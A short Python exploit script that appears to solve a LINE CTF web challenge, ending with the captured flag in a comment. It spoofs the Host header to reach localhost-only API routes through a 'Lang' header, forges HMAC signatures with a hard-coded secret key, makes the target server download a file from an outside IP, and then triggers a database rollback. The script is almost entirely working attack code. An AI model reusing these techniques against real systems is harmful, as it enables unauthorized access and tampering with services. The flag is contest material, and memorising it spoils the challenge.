import hmac
import hashlib
import requests

url = 'http://35.200.63.50/apis/'

Key = hashlib.sha512(('ed05a1c7ff6428dcf8d50901b6e78ba3').encode('ascii')).hexdigest()
print('[+] Key  : ' + Key)

def sign(KEY):
    privateKey = b'let\'sbitcorinparty'
    EN = hmac.new( privateKey , KEY.encode('utf-8'), hashlib.sha512 )
    return EN.hexdigest()

def integrityStatus():
    headers = {'Host':'localhost:5000', 'Lang':'/integrityStatus'}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/integreityStatus : ' + res.headers['lang'])

def download():
    headers = {'Host':'localhost:5000', 'Lang':'download?src=http://141.164.52.207/a123', 'Sign':sign('src=http://141.164.52.207/a123')}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/download : ' + res.headers['lang'])

def rollback():
    headers = {'Host':'localhost:5000', 'Lang':'/rollback?dbhash=a123', 'Sign':sign('dbhash=a123'), 'Key':Key}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/rollback : ' + res.headers['lang'])

if __name__ == '__main__':
    integrityStatus()
    download()
    rollback()

# Output : LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}